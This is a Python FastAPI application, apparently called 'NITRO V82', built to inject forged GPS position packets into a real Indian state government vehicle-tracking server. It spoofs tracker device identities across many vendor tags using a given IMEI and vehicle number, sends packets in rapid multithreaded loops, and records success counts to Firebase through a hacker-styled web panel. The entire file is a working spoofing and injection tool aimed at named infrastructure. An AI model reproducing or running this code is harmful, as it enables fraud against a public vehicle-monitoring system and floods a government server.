import socket
import threading
import time
from datetime import datetime, timedelta, timezone
from fastapi import FastAPI, BackgroundTasks
from fastapi.responses import HTMLResponse
import firebase_admin
from firebase_admin import credentials, db

app = FastAPI()

# --- FIREBASE SETUP ---
# Ensure serviceAccountKey.json is in your GitHub repo
try:
    cred = credentials.Certificate("serviceAccountKey.json")
    firebase_admin.initialize_app(cred, {
        'databaseURL': 'https://ghop-ghop-gps-injection-default-rtdb.firebaseio.com/'
    })
except Exception as e:
    print(f"Firebase Init Error: {e}")

# --- GLOBAL CONTROL ---
firing = False
total_sent = 0
TARGET_IP = "vlts.bihar.gov.in"
TARGET_PORT = 9999
TAG_LIST = ["RA18", "WTEX", "MARK", "ASPL", "LOCT14A", "ACT1", "AIS140", "VLTD", "AMAZON", "BBOX77", "EGAS", "MENT", "MIJO", "ROADRPA"]

def format_coord(val):
    try:
        p = str(val).split('.')
        if len(p) == 1: return f"{p[0]}.0000000"
        return f"{p[0]}.{p[1][:7].ljust(7, '0')}"
    except: return val

# --- HYPER SONIC LOGIC (4-THREAD CHUNKING) ---
def rapid_fire(tag_chunk, imei, vno, lat, lon):
    global firing, total_sent
    while firing:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 0) # Bypass OS Buffer
            s.settimeout(5)
            s.connect((TARGET_IP, TARGET_PORT))
            
            while firing:
                for tag in tag_chunk:
                    now = datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)
                    dt, tm = now.strftime('%d%m%Y'), now.strftime('%H%M%S')
                    lt, ln = format_coord(lat), format_coord(lon)
                    
                    suffix = "e3c8,e3c7,0a83,7,e3fb,0a83,7,c79d,0a83,10,e3f9,0a83,0,0001,00,000041"
                    pkt = f"$PVT,{tag},2.1.1,NR,01,L,{imei},{vno},1,{dt},{tm},{lt},N,{ln},E,0.00,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a83,{suffix},DDE3*\r\n"
                    
                    s.sendall(pkt.encode('ascii'))
                    total_sent += 1
                
                # Update Firebase every bunch
                db.reference('/Success_Reports').push({
                    'vno': vno,
                    'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    'packets': total_sent
                })
                time.sleep(0.01) # Hyper Sonic Speed
        except:
            time.sleep(0.1)
        finally:
            try: s.close()
            except: pass

# --- HTML INTERFACE (HACKER STYLE) ---
@app.get("/", response_class=HTMLResponse)
async def get_interface():
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>NITRO V82 | BYPASS ENGINE</title>
        <style>
            body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
            .terminal { width: 400px; padding: 20px; border: 1px solid #0f0; box-shadow: 0 0 15px #0f0; background: rgba(0,20,0,0.9); border-radius: 10px; }
            h2 { text-align: center; letter-spacing: 3px; border-bottom: 1px solid #0f0; padding-bottom: 10px; }
            input { width: 100%; background: #000; border: 1px solid #0f0; color: #0f0; padding: 8px; margin: 10px 0; box-sizing: border-box; text-transform: uppercase; }
            button { width: 100%; padding: 10px; background: transparent; color: #0f0; border: 1px solid #0f0; cursor: pointer; font-weight: bold; margin-top: 10px; }
            button:hover { background: #0f0; color: #000; }
            #status { margin-top: 15px; font-size: 12px; text-align: center; color: #aaa; }
            .blink { animation: blink 1s infinite; }
            @keyframes blink { 50% { opacity: 0; } }
        </style>
    </head>
    <body>
        <div class="terminal">
            <h2>NITRO V82</h2>
            <input type="text" id="vno" placeholder="VEHICLE NO" value="UP51T8261">
            <input type="text" id="imei" placeholder="IMEI" value="358980101447242">
            <input type="text" id="lat" placeholder="LATITUDE" value="25.6501550">
            <input type="text" id="lon" placeholder="LONGITUDE" value="84.7851780">
            <button onclick="start()">INITIATE INJECTION</button>
            <button onclick="stop()" style="color: #f00; border-color: #f00;">ABORT SYSTEM</button>
            <div id="status">READY FOR UPLOAD...</div>
        </div>
        <script>
            function start() {
                const params = `vno=${document.getElementById('vno').value}&imei=${document.getElementById('imei').value}&lat=${document.getElementById('lat').value}&lon=${document.getElementById('lon').value}`;
                document.getElementById('status').innerHTML = "<span class='blink'>UPLOADING PACKETS TO BIHAR_VLTS...</span>";
                fetch(`/run_start?${params}`).then(r => r.json());
            }
            function stop() {
                fetch('/run_stop').then(r => r.json());
                document.getElementById('status').innerHTML = "SYSTEM ABORTED.";
            }
        </script>
    </body>
    </html>
    """

# --- API ENDPOINTS ---
@app.get("/run_start")
def run_start(background_tasks: BackgroundTasks, imei: str, vno: str, lat: str, lon: str):
    global firing, total_sent
    if not firing:
        firing = True
        total_sent = 0
        chunks = [TAG_LIST[i:i + 4] for i in range(0, len(TAG_LIST), 4)]
        for chunk in chunks:
            background_tasks.add_task(rapid_fire, chunk, imei, vno.upper(), lat, lon)
        return {"status": "started"}
    return {"status": "busy"}

@app.get("/run_stop")
def run_stop():
    global firing
    firing = False
    return {"status": "stopped"}
